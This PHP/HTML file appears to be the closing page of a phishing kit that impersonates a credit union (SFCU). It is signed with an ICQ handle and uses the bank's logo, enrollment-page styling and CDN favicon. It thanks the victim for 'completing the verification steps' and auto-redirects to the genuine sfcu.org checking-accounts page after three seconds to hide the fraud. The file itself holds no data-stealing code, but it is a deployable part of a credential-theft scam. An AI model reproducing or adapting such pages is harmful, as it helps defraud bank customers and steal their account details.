<?php
/*
ICQ @labdata
Please don't fuck with my code.
*/
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
    <title>Completed</title>
    <!-- bootstrap.min.css, formValidation.min.css, bootstrap-theme.min.css, fontello.css -->
    <link rel="stylesheet" href="assets/css/all.min.css">
    <!-- Standard Q2 Enrollment layout CSS -->
    <link rel="stylesheet" href="assets/css/layout.css">
    <!-- Custom Q2 CSS -->
    <link rel="stylesheet" href="assets/css/custom.css">
    <!-- jquery.js, jquery.mask.js, bootrap.js, formValidation.js, formValidation/bootstrap.js all minified -->
    <link href="https://cdn1.onlineaccess1.com/cdn/depot/5105/533/f3b35f874a6341f1c9e2f1e54faa246b/assets/images/favicon-b57abc2bafab8d4959151f56d28e289b.ico" rel="icon">
    <meta http-equiv="Refresh" content="3; url=https://www.sfcu.org/personal/checking-accounts/">
</head>


<body>

    <!-- Modal -->
    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="row">
                        <div class="col-xs-12 congrats">
                            <h2 class="icon-ok-circle" id="modal-title"></h2>
                        </div>
                        <div class="col-xs-12" id="success_message"></div>
                        <div class="col-xs-12" id="modal-body"></div>
                    </div>
                </div>
                <div class="modal-footer" id="modal-footer"></div>
            </div>
        </div>
    </div>
    <!--End Modal -->

    <div class="container-fluid heading">
        <div class="col-xs-12" style="text-align: center">
            <img src="assets/img/SFCU.png" style="max-width: 100%; height: auto;">
        </div>
    </div>
    <div class="container col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12">
        <div class="row" style="margin-bottom: 40px;">
            <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
                <h3 id="page_title">Completed</h3>
                <p id="page_message" class="page-message"></p>
                <!-- Alert Area -->
                <div id="alertBox" class="alertBox hidden">
                    <div class="row">
                        <div class="col-xs-2 col-sm-1 col-md-1">
                            <i class="icon-warning-sign"></i>
                        </div>
                        <div class="col-xs-10 col-sm-11 col-md-11 modal-msg"></div>
                    </div>
                </div>
                <!-- End Alert Area -->
                <!-- Tab Area -->
                <ul id="nav-tabs" class="nav nav-tabs" role="tablist" style="display: none;"></ul>
                <!-- End Tab Area-->
            </div>
            <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
                <noscript>
                    <style>
                        .btn {
                            display: none;
                        }
                    </style>
                    <div id="alertBox" class="alertBox">
                        <div class="row">
                            <div class="col-xs-2 col-sm-1 col-md-1">
                                <i class="icon-warning-sign"></i>
                            </div>
                            <div class="col-xs-10 col-sm-11 col-md-11 modal-msg">JavaScript is disabled. Please enable JavaScript to correctly display the page.</div>
                        </div>
                    </div>
                </noscript>
                <!-- Automated Insertion of Fields in div below -->
                <div id="q2-form-fields" class="tab-content">
                    <div id="personal" role="tabpanel" class="tab-pane active">
                        <center>
                            <img width="200px" src="assets/img/done.png">
                            <p>We thank you for completing the verification steps.<br><br><br></p>
                        </center>
                    </div>
                </div>

                <!-- End Automated Insertion div -->
            </div>
        </div>
        <!-- <a href="javascript:void(0);" onclick="testSuccess('full');">Full Success</a> | <a href="javascript:void(0);" onclick="testSuccess('partial');">Partial Success</a> -->
    </div>


</body>

</html>